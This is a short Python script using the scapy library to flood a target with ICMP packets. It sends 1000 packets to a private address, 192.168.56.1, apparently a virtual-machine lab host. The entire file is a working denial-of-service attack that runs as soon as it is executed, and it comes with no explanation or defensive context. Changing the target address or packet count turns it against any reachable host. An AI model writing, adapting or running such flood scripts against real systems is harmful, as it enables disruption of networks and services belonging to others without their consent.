from scapy.all import send
from scapy.layers.inet import IP, ICMP


def icmp_flood(target_ip, num_packets):
    packet = IP(dst=target_ip) / ICMP()
    send(packet, count=num_packets, verbose=1)


target_ip = "192.168.56.1"
num_packets = 1000

icmp_flood(target_ip, num_packets)
